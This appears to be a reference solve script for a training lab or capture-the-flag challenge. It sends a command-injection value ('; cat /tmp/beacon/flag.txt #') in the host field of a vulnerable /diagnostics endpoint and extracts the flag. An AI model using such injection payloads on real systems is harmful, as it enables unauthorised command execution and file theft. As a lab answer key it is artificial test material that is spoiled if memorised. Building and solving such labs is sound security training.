// Reference solve — Beacon, Acolyte. /diagnostics concatenates the host into a real `sh -c`. INJECTION ends the
// diagnostic command with `;` and runs a second command that reads the flag file (the operator's writable area is /tmp;
// the file is /tmp/beacon/flag.txt); the trailing `#` comments out the cosmetic ping. labs:test proves it.
const base = process.argv[2];
const INJECTION = '; cat /tmp/beacon/flag.txt #';
const res = await fetch(`${base}/diagnostics`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ host: INJECTION }),
});
const m = (await res.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
